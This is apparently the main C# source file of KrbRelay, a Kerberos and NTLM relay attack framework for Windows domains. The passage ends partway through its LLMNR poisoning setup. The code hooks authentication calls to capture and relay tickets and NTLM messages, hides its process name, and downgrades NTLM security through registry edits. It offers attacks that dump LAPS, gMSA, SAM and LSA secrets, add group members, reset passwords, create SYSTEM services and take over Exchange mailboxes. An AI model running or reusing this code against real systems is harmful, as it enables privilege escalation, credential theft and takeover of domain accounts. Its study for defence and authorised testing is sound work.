using KrbRelay.Clients;
using KrbRelay.Com;
using Microsoft.Win32;
using NetFwTypeLib;
using SMBLibrary;
using SMBLibrary.Client;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using static KrbRelay.Natives;

namespace KrbRelay
{
    internal class Program
    {
        public static string SetProcessModuleName(string s)
        {
            IntPtr hProcess = GetCurrentProcess();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            UInt32 RetLen = 0;
            IntPtr temp;
            NtQueryInformationProcess(hProcess, 0, ref pbi, Marshal.SizeOf(pbi), ref RetLen);

            //https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters
            IntPtr pProcessParametersOffset = (IntPtr)(pbi.PebBaseAddress + 0x20);
            byte[] addrBuf = new byte[IntPtr.Size];
            ReadProcessMemory(hProcess, pProcessParametersOffset, addrBuf, addrBuf.Length, out temp);
            IntPtr processParametersOffset = (IntPtr)BitConverter.ToInt64(addrBuf, 0);
            IntPtr imagePathNameOffset = processParametersOffset + 0x060;
            //Console.WriteLine("processParametersOffset: 0x{0:X}", processParametersOffset.ToInt64());
            //Console.WriteLine("imagePathNameOffset: 0x{0:X}", imagePathNameOffset.ToInt64());

            //read imagePathName
            byte[] addrBuf2 = new byte[Marshal.SizeOf(typeof(UNICODE_STRING))];
            ReadProcessMemory(hProcess, imagePathNameOffset, addrBuf2, addrBuf2.Length, out temp);
            UNICODE_STRING str = Helpers.ReadStruct<UNICODE_STRING>(addrBuf2);
            byte[] addrBuf3 = new byte[str.Length];
            ReadProcessMemory(hProcess, str.Buffer, addrBuf3, addrBuf3.Length, out temp);
            string oldName = Encoding.Unicode.GetString(addrBuf3);

            //write imagePathName
            byte[] b = Encoding.Unicode.GetBytes(s + "\x00");
            WriteProcessMemory(hProcess, str.Buffer, b, b.Length, out temp);

            CloseHandle(hProcess);
            return oldName;
        }

        public static void setUserData(int SessionId)
        {
            if (SessionId != -123)
            {
                uint bytesReturned;
                bool worked;
                IntPtr buffer = IntPtr.Zero;

                try { 
                    worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.ConnectState, out buffer, out bytesReturned);
                    var state = (WTS_CONNECTSTATE_CLASS)Enum.ToObject(typeof(WTS_CONNECTSTATE_CLASS), Marshal.ReadInt32(buffer));
                    if (state != WTS_CONNECTSTATE_CLASS.Active)
                        Console.WriteLine("[-] WARNING, user's session is not active");
                }
                catch
                {
                    Console.WriteLine("[-] Session {0} does not exists", SessionId);
                    Environment.Exit(0);
                }

                worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.DomainName, out buffer, out bytesReturned);
                relayedUserDomain = Marshal.PtrToStringAnsi(buffer);

                worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.UserName, out buffer, out bytesReturned);
                relayedUser = Marshal.PtrToStringAnsi(buffer);
            }
            else
            {
                relayedUser = Environment.MachineName + "$";
                relayedUserDomain = domainDN.Replace(",", ".").Replace("DC=", "");
            }
            if (string.IsNullOrEmpty(targetFQDN))
            {
                Console.WriteLine("[*] Auth Context: {0}\\{1}", relayedUserDomain, relayedUser);
            }
            else
            {
                Console.WriteLine("[*] Relaying context: {0}\\{1}", relayedUserDomain, relayedUser);
            }
        }


        //
        private static void GetRegKey(string key, string name, out object result)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
            if (Lsa != null)
            {
                object value = Lsa.GetValue(name);
                if (value != null)
                {
                    result = value;
                    return;
                }
            }
            result = null;
        }
        private static void SetRegKey(string key, string name, object value)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
            if (Lsa != null)
            {
                if (value == null)
                {
                    Lsa.DeleteValue(name);
                }
                else
                {
                    Lsa.SetValue(name, value);
                }
            }
        }
        private static void SetDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
        {
            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", out oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", out oldValue_RestrictSendingNTLMTraffic);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
        }
        private static void RestoreDowngrade(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)
        {
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
        }

        public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
        public static IntPtr ld = IntPtr.Zero;
        public static byte[] ntlm1 = new byte[] { };
        public static byte[] ntlm2 = new byte[] { };
        public static byte[] ntlm3 = new byte[] { };
        public static byte[] apRep1 = new byte[] { };
        public static byte[] apRep2 = new byte[] { };
        public static byte[] ticket = new byte[] { };
        public static string spn = "";
        public static string relayedUser = "";
        public static string relayedUserDomain = "";
        public static string domain = "";
        public static string domainDN = "";
        public static string targetFQDN = "";
        public static bool useSSL = false;
        public static bool stopSpoofing = false;
        public static bool downgrade = false;
        public static bool ntlm = false;
        public static Dictionary<string, string> attacks = new Dictionary<string, string>();
        public static SMB2Client smbClient = new SMB2Client();
        public static HttpClientHandler handler = new HttpClientHandler();
        public static HttpClient httpClient = new HttpClient();
        public static CookieContainer CookieContainer = new CookieContainer();

        //hooked function
        [STAThread]
        public static SecStatusCode AcceptSecurityContext_kerb(
            [In] SecHandle phCredential,
            [In] SecHandle phContext,
            [In] SecurityBufferDescriptor pInput,
            AcceptContextReqFlags fContextReq,
            SecDataRep TargetDataRep,
            [In, Out] SecHandle phNewContext,
            [In, Out] IntPtr pOutput,
            out AcceptContextRetFlags pfContextAttr,
            [Out] SECURITY_INTEGER ptsExpiry)
        {
            //get kerberos tickets sent to our com server
            if (apRep1.Length == 0)
            {
                //ap_req
                ticket = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
                int ticketOffset = Helpers.PatternAt(ticket, new byte[] { 0x6e, 0x82 }); // 0x6e, 0x82, 0x06
                ticket = ticket.Skip(ticketOffset).ToArray();
                ticket = Helpers.ConvertApReq(ticket);
                if(ticket[0] != 0x60)
                {
                    Console.WriteLine("[-] Recieved invalid apReq, exploit will fail");
                    Console.WriteLine("{0}", Helpers.ByteArrayToString(ticket));
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("[*] apReq: {0}", Helpers.ByteArrayToString(ticket));
                }
            }
            else
            {
                apRep2 = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
                int apRep2Offset = Helpers.PatternAt(apRep2, new byte[] { 0x6f }, true);
                apRep2 = apRep2.Skip(apRep2Offset).ToArray();
                ticket = apRep2;
                Console.WriteLine("[*] apRep2: {0}", Helpers.ByteArrayToString(ticket));
            }

            string service = spn.Split('/').First();
            if (service.ToLower() == "ldap")
            {
                Ldap.Connect();
            }
            else if (service.ToLower() == "http")
            {
                Http.Connect();
            }
            else if (service.ToLower() == "cifs")
            {
                Smb.Connect();
            }

            //overwrite security buffer
            var pOutput2 = new SecurityBufferDescriptor(12288);
            //var buffer = new SecurityBufferDescriptor(msgidbytes);
            //var buffer = new SecurityBuffer(apRep1);
            //int size = Marshal.SizeOf(buffer);
            //int size2 = apRep1.Length;
            //var BufferPtr = Marshal.AllocHGlobal(size);
            //Marshal.StructureToPtr(buffer, BufferPtr, false);
            //byte[] BufferBytes = new byte[size];
            //Marshal.Copy(BufferPtr, BufferBytes, 0, size);
            var ogSecDesc = (SecurityBufferDescriptor)Marshal.PtrToStructure(pOutput, typeof(SecurityBufferDescriptor));
            var ogSecBuffer = (SecurityBuffer)Marshal.PtrToStructure(ogSecDesc.BufferPtr, typeof(SecurityBuffer));

            SecStatusCode ret = AcceptSecurityContext(
                phCredential,
                phContext,
                pInput,
                fContextReq,
                TargetDataRep,
                phNewContext,
                pOutput2,
                out pfContextAttr,
                ptsExpiry);

            //overwrite SecurityBuffer bytes
            if (apRep2.Length == 0)
            {
                byte[] nbytes = new byte[254];
                Marshal.Copy(apRep1, 0, ogSecBuffer.Token + 116, apRep1.Length); // verify this 116 offset?
                Marshal.Copy(nbytes, 0, (IntPtr)ogSecBuffer.Token + apRep1.Length + 116, nbytes.Length);
            }

            Console.WriteLine("[*] AcceptSecurityContext: {0}", ret);
            Console.WriteLine("[*] fContextReq: {0}", fContextReq);

            return ret;
        }

        public static SecStatusCode AcceptSecurityContext_ntlm(
            [In] SecHandle phCredential,
            [In] SecHandle phContext,
            [In] SecurityBufferDescriptor pInput,
            AcceptContextReqFlags fContextReq,
            SecDataRep TargetDataRep,
            [In, Out] SecHandle phNewContext,
            [In, Out] IntPtr pOutput,
            out AcceptContextRetFlags pfContextAttr,
            [Out] SECURITY_INTEGER ptsExpiry)
        {
            if (ntlm1.Length == 0)
            {
                ntlm1 = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
                int ntlm1Pattern = Helpers.PatternAt(ntlm1, new byte[] { 0x4e, 0x54 });
                ntlm1 = ntlm1.Skip(ntlm1Pattern).ToArray();
                Console.WriteLine("[*] NTLM1");
                Console.WriteLine(Helpers.ByteArrayToString(ntlm1));
                ticket = ntlm1;
            }
            else
            {
                ntlm3 = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
                int ntlm3Pattern = Helpers.PatternAt(ntlm3, new byte[] { 0x4e, 0x54 });
                ntlm3 = ntlm3.Skip(ntlm3Pattern).ToArray();
                ticket = ntlm3;

                if (ntlm2.Length > 1 && ntlm3.Length > 1)
                {
                    Helpers.parseNTLM(ntlm2, ntlm3);
                }
                if (string.IsNullOrEmpty(targetFQDN))
                {
                    pfContextAttr = AcceptContextRetFlags.None;
                    return SecStatusCode.SEC_E_LOGON_DENIED;
                }
            }

            //string service = spn.Split('/').First();
            //if (service.ToLower() == "ldap")
            //{
            //    Ldap.Connect();
            //}
            //else if (service.ToLower() == "http")
            //{
            //    Http.Connect();
            //}
            //else if (service.ToLower() == "cifs")
            //{
            //    Smb.Connect();
            //}

            //overwrite security buffer
            var pOutput2 = new SecurityBufferDescriptor(12288);
            var ogSecDesc = (SecurityBufferDescriptor)Marshal.PtrToStructure(pOutput, typeof(SecurityBufferDescriptor));
            var ogSecBuffer = (SecurityBuffer)Marshal.PtrToStructure(ogSecDesc.BufferPtr, typeof(SecurityBuffer));

            SecStatusCode ret;
            if (!string.IsNullOrEmpty(targetFQDN))
            {
                ret = AcceptSecurityContext(
                phCredential,
                phContext,
                pInput,
                fContextReq,
                TargetDataRep,
                phNewContext,
                pOutput2,
                out pfContextAttr,
                ptsExpiry);
            }
            else
            {
                ret = AcceptSecurityContext(
                phCredential,
                phContext,
                pInput,
                fContextReq,
                TargetDataRep,
                phNewContext,
                pOutput,
                out pfContextAttr,
                ptsExpiry);
            }

            var ogSecDesc2 = (SecurityBufferDescriptor)Marshal.PtrToStructure(pOutput, typeof(SecurityBufferDescriptor));
            var ogSecBuffer2 = (SecurityBuffer)Marshal.PtrToStructure(ogSecDesc2.BufferPtr, typeof(SecurityBuffer));
            byte[] ntlm2bytes = ogSecDesc2.ToByteArray();
            int ntlm2Pattern = Helpers.PatternAt(ntlm2bytes, new byte[] { 0x4e, 0x54 });

            if (downgrade)
            {
                //disable extended security
                byte temp = (byte)(Marshal.ReadByte(ogSecBuffer2.Token + ntlm2Pattern + 22) & 0xF7);
                Marshal.WriteByte(ogSecBuffer2.Token + ntlm2Pattern + 22, 0, temp);

                //replace challenge
                byte[] challengebytes = Helpers.StringToByteArray("1122334455667788");
                Marshal.Copy(challengebytes, 0, (IntPtr)ogSecBuffer2.Token + ntlm2Pattern + 24, challengebytes.Length);
            }

            if (string.IsNullOrEmpty(targetFQDN))
            {
                //null out reserved bytes
                byte[] nbytes = new byte[8];
                Marshal.Copy(nbytes, 0, (IntPtr)ogSecBuffer2.Token + ntlm2Pattern + 32, nbytes.Length);

                ntlm2 = ogSecDesc2.ToByteArray();
                ntlm2 = ntlm2.Skip(ntlm2Pattern).ToArray();
                Console.WriteLine("[*] NTLM2");
                Console.WriteLine(Helpers.ByteArrayToString(ntlm2));
            }
            else
            {
                byte[] nbytess = new byte[254];
                Marshal.Copy(ntlm2, 0, ogSecBuffer.Token + 116, ntlm2.Length); // verify this 116 offset?
                Marshal.Copy(nbytess, 0, (IntPtr)ogSecBuffer.Token + ntlm2.Length + 116, nbytess.Length);
            }

            Console.WriteLine("[*] AcceptSecurityContext: {0}", ret);
            Console.WriteLine("[*] fContextReq: {0}", fContextReq);

            return ret;
        }

        private static void ShowHelp()
        {
            Console.WriteLine();
            Console.WriteLine("KrbRelay by @Cube0x0");
            Console.WriteLine("The Relaying Kerberos Framework");
            Console.WriteLine();

            Console.WriteLine("Usage: KrbRelay.exe -spn <SPN> [OPTIONS] [ATTACK]");
            Console.WriteLine("LDAP attacks:");
            Console.WriteLine("-console                         Interactive LDAP console");
            Console.WriteLine("-rbcd <SID> <OPTIONAL TARGET>    Configure RBCD for a given SID (default target localhost)");
            Console.WriteLine("-shadowcred <OPTIONAL TARGET>    Configure msDS-KeyCredentialLink (default target localhost)");
            Console.WriteLine("-laps <OPTIONAL TARGET>          Dump LAPS passwords");
            Console.WriteLine("-gMSA <OPTIONAL TARGET>          Dump gMSA passwords");
            Console.WriteLine("-add-groupmember <GROUP> <USER>  Add user to group");
            Console.WriteLine("-reset-password  <USER> <PASS>   Reset domain user password");
            Console.WriteLine();

            Console.WriteLine("SMB attacks:");
            Console.WriteLine("-console                         Interactive SMB console");
            Console.WriteLine("-list                            List SMB shares");
            Console.WriteLine("-add-privileges <SID>            Add privileges for a given SID");
            Console.WriteLine("-secrets                         Dump SAM & LSA secrets");
            Console.WriteLine("-service-add <NAME> <COMMAND>    Create SYSTEM service");
            //Console.WriteLine("-set-secquestions                Reset security questions");
            //Console.WriteLine("-reset-password  <USER> <PASS>   Reset local user password");
            //Console.WriteLine("printdriver-add <DLL>           Add printer driver");
            //Console.WriteLine("-reg-query                     Query registry key");
            //Console.WriteLine("-upload   <Path>                 Upload file via SMB");
            //Console.WriteLine("-download <Path>                 Download file via SMB");
            Console.WriteLine();

            Console.WriteLine("HTTP attacks:");
            Console.WriteLine("-endpoint <ENDPOINT>             Example; 'EWS/Exchange.asmx'");
            Console.WriteLine("-proxy                           Start a HTTP proxy server against target");
            //Console.WriteLine("-adcs <TEMPLATE>                 Generate certificate");
            //Console.WriteLine("-ews-console                   EWS console");
            Console.WriteLine("-ews-delegate <USER@DOMAIN>      EWS delegate mailbox");
            //Console.WriteLine("-ews-read   <LIMIT>              Read victims inbox");
            Console.WriteLine("-ews-search <KEYWORD,KEYWORD2>   Search inbox for keywords");
            Console.WriteLine();

            Console.WriteLine("Options:");
            Console.WriteLine("-ssl                      Use SSL transport");
            Console.WriteLine("-spn                      ServicePrincipalName for target service");
            Console.WriteLine("-clsid                    Service to be executed in");
            Console.WriteLine("-session                  ID for cross-session marshalling");
            Console.WriteLine("-port                     COM listener port");
            Console.WriteLine("-llmnr                    LLMNR poisoning");
        }

        public static bool checkPort(int port, string name = "SYSTEM")
        {
            INetFwMgr mgr = (INetFwMgr)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwMgr"));
            if (!mgr.LocalPolicy.CurrentProfile.FirewallEnabled)
            {
                return true;
            }
            mgr.IsPortAllowed(name, NET_FW_IP_VERSION_.NET_FW_IP_VERSION_ANY, port, "", NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP, out object allowed, out object restricted);
            return (bool)allowed;
        }

        public static int checkPorts(string[] names)
        {
            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] tcpConnInfoArray = ipGlobalProperties.GetActiveTcpListeners();
            List<int> tcpPorts = tcpConnInfoArray.Select(i => i.Port).ToList();

            foreach (string name in names)
            {
                for (int i = 1; i < 65535; i++)
                {
                    if (checkPort(i, name) && !tcpPorts.Contains(i))
                    {
                        return i;
                    }
                }
            }
            return -1;
        }

        public static void Main(string[] args)
        {
            string clsid = "";
            string service = "";
            int sessionID = -123;
            string port = "12345";
            bool show_help = false;
            bool llmnr = false;
            Guid clsId_guid = new Guid();

            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToUpper();

                switch (argument)
                {
                    case "-NTLM":
                    case "/NTLM":
                        ntlm = true;
                        break;

                    case "-DOWNGRADE":
                    case "/DOWNGRADE":
                        downgrade = true;
                        break;

                    //
                    case "-CONSOLE":
                    case "/CONSOLE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("console", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("console", "");
                        }
                        break;
                    // ldap attacks
                    case "-RBCD":
                    case "/RBCD":
                        try
                        {
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("rbcd", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            try
                            {
                                if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                    throw new Exception();
                                attacks.Add("rbcd", args[entry.index + 1] + " " + "");
                            }
                            catch
                            {
                                Console.WriteLine("[-] -rbcd requires an argument");
                                return;
                            }
                        }
                        break;

                    case "-SHADOWCRED":
                    case "/SHADOWCRED":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("shadowcred", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("shadowcred", "");
                        }
                        break;

                    case "-LAPS":
                    case "/LAPS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("laps", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("laps", "");
                        }
                        break;

                    case "-GMSA":
                    case "/GMSA":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("gmsa", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("gmsa", "");
                        }
                        break;

                    case "-ADD-GROUPMEMBER":
                    case "/ADD-GROUPMEMBER":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("add-groupmember", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-groupmember requires two arguments");
                            return;
                        }
                        break;

                    case "-RESET-PASSWORD":
                    case "/RESET-PASSWORD":
                        try
                        {
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("reset-password", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -reset-password requires two arguments");
                            return;
                        }
                        break;

                    // smb attacks
                    case "-LIST":
                    case "/LIST":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("list", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("list", "");
                        }
                        break;

                    case "-UPLOAD":
                    case "/UPLOAD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("upload", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -upload requires an argument");
                            return;
                        }
                        break;

                    case "-DOWNLOAD":
                    case "/DOWNLOAD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("download", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -download requires an argument");
                            return;
                        }
                        break;

                    case "-SECRETS":
                    case "/SECRETS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("secrets", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("secrets", "");
                        }
                        break;

                    case "-ADD-PRIVILEGES":
                    case "/ADD-PRIVILEGES":
                        try
                        {
                            attacks.Add("add-privileges", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-privileges requires an argument");
                            return;
                        }
                        break;

                    case "-SERVICE-ADD":
                    case "/SERVICE-ADD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("service-add", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -service-add requires two arguments");
                            return;
                        }
                        break;

                    case "-ADD-PRINTERDRIVER":
                    case "/ADD-PRINTERDRIVER":
                        try
                        {
                            attacks.Add("add-priverdriver", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-priverdriver requires an argument");
                            return;
                        }
                        break;

                    // http attacks
                    case "-ENDPOINT":
                    case "/ENDPOINT":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("endpoint", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -endpoint requires an argument");
                            return;
                        }
                        break;

                    case "-ADCS":
                    case "/ADCS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("adcs", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -adcs requires an argument");
                            return;
                        }
                        break;

                    case "-PROXY":
                    case "/PROXY":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("proxy", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("proxy", "");
                        }
                        break;

                    case "-EWS-CONSOLE":
                    case "/EWS-CONSOLE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("ews-console", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("ews-console", "");
                        }
                        break;

                    case "-EWS-DELEGATE":
                    case "/EWS-DELEGATE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("ews-delegate", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -ews-delegate requires an argument");
                            return;
                        }
                        break;

                    case "-EWS-SEARCH":
                    case "/EWS-SEARCH":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("ews-search", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -ews-search requires an argument");
                            return;
                        }
                        break;

                    //optional
                    case "-H":
                    case "/H":
                        show_help = true;
                        break;

                    case "-SSL":
                    case "/SSL":
                        useSSL = true;
                        break;
                    case "-LLMNR":
                    case "/LLMNR":
                        llmnr = true;
                        break;

                    case "-PORT":
                    case "/PORT":
                        port = args[entry.index + 1];
                        break;

                    case "-SPN":
                    case "/SPN":
                        spn = args[entry.index + 1];
                        break;

                    case "-CLSID":
                    case "/CLSID":
                        clsid = args[entry.index + 1];
                        break;

                    case "-SESSION":
                    case "/SESSION":
                        sessionID = Int32.Parse(args[entry.index + 1]);
                        break;
                }
            }

            if (show_help)
            {
                ShowHelp();
                return;
            }

            if (string.IsNullOrEmpty(spn) && ntlm == false)
            {
                Console.WriteLine("Missing /spn: parameter");
                Console.WriteLine("KrbRelay.exe -h for help");
                return;
            }

            if (string.IsNullOrEmpty(clsid))
            {
                Console.WriteLine("Missing /clsid: parameter");
                Console.WriteLine("KrbRelay.exe -h for help");
                return;
            }

            if (!string.IsNullOrEmpty(spn))
            {
                service = spn.Split('/').First().ToLower();
                if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
                {
                    Console.WriteLine("'{0}' service not supported", service);
                    Console.WriteLine("choose from CIFS, LDAP and HTTP");
                    return;
                }
                string[] d = spn.Split('.').Skip(1).ToArray();
                domain = string.Join(".", d);

                string[] dd = spn.Split('/').Skip(1).ToArray();
                targetFQDN = string.Join(".", dd);

            }

            if (!string.IsNullOrEmpty(domain))
            {
                var domainComponent = domain.Split('.');
                foreach (string dc in domainComponent)
                {
                    domainDN += string.Concat(",DC=", dc);
                }
                domainDN = domainDN.TrimStart(',');
            }

            if (!string.IsNullOrEmpty(clsid))
                clsId_guid = new Guid(clsid);

            //
            setUserData(sessionID);

            if (service == "ldap")
            {
                var ldap_ptsExpiry = new SECURITY_INTEGER();
                var status = AcquireCredentialsHandle(
                    null,
                    "Negotiate",
                    2,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref ldap_phCredential,
                    IntPtr.Zero);
                //Console.WriteLine("[*] AcquireCredentialsHandle:  {0}", (SecStatusCode)status);

                var timeout = new LDAP_TIMEVAL
                {
                    tv_sec = (int)(new TimeSpan(0, 0, 60).Ticks / TimeSpan.TicksPerSecond)
                };
                if (useSSL)
                {
                    //ld = Ldap.ldap_sslinit(targetFQDN, 636, 1);
                    ld = ldap_init(targetFQDN, 636);
                }
                else
                {
                    ld = ldap_init(targetFQDN, 389);
                }

                uint LDAP_OPT_ON = 1;
                uint version = 3;
                var ldapStatus = ldap_set_option(ld, 0x11, ref version);

                if (useSSL)
                {
                    ldap_get_option(ld, 0x0a, out int lv);  //LDAP_OPT_SSL
                    if (lv == 0)
                        ldap_set_option(ld, 0x0a, ref LDAP_OPT_ON);

                    ldap_get_option(ld, 0x0095, out lv);  //LDAP_OPT_SIGN
                    if (lv == 0)
                        ldap_set_option(ld, 0x0095, ref LDAP_OPT_ON);

                    ldap_get_option(ld, 0x0096, out lv);  //LDAP_OPT_ENCRYPT
                    if (lv == 0)
                        ldap_set_option(ld, 0x0096, ref LDAP_OPT_ON);
                    
                    Helpers.TrustAllCertificates(ld);
                }

                ldapStatus = ldap_connect(ld, timeout);
                if (ldapStatus != 0)
                {
                    Console.WriteLine("[-] Could not connect to {0}. ldap_connect failed with error code 0x{1}", targetFQDN, ldapStatus.ToString("x2"));
                    return;
                }
            }
            if (service == "cifs")
            {
                bool isConnected = smbClient.Connect(targetFQDN, SMBTransportType.DirectTCPTransport);
                if (!isConnected)
                {
                    Console.WriteLine("[-] Could not connect to {0}:445", targetFQDN);
                    return;
                }
            }
            if (service == "http")
            {
                if (!attacks.Keys.Contains("endpoint") || string.IsNullOrEmpty(attacks["endpoint"]))
                {
                    Console.WriteLine("[-] -endpoint parameter is required for HTTP");
                    return;
                }
                //handler = new HttpClientHandler() { PreAuthenticate = false, UseCookies = false };
                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                handler = new HttpClientHandler() { UseDefaultCredentials = false, PreAuthenticate = false, UseCookies = true };
                //handler.AutomaticDecompression = DecompressionMethods.Deflate | DecompressionMethods.GZip;
                //handler.ClientCertificateOptions = ClientCertificateOption.Manual;
                //handler.AllowAutoRedirect = true;
                //handler.Proxy = new WebProxy("http://localhost:8080");

                //handler.ServerCertificateCustomValidationCallback =
                //    (httpRequestMessage, cert, cetChain, policyErrors) =>
                //    {
                //        return true;
                //    };
                httpClient = new HttpClient(handler) { Timeout = new TimeSpan(0, 0, 10) };
                string transport = "http";
                if (useSSL)
                {
                    transport = "https";
                }
                httpClient.BaseAddress = new Uri(string.Format("{0}://{1}", transport, targetFQDN));
                //Console.WriteLine(httpClient.BaseAddress);
            }


            if (llmnr)
            {
                if(service == "ldap")
                {
                    Console.WriteLine("[-] LLMNR will not work with ldap");
                    return;
                }

                string argLLMNRTTL = "30";
                string argSpooferIP = "";
                string argSpooferIPv6 = "";

                if (!String.IsNullOrEmpty(argSpooferIP)) { try { IPAddress.Parse(argSpooferIP); } catch { throw new ArgumentException("SpooferIP value must be an IP address"); } }
                if (!String.IsNullOrEmpty(argSpooferIPv6)) { try { IPAddress.Parse(argSpooferIPv6); } catch { throw new ArgumentException("SpooferIP value must be an IP address"); } }
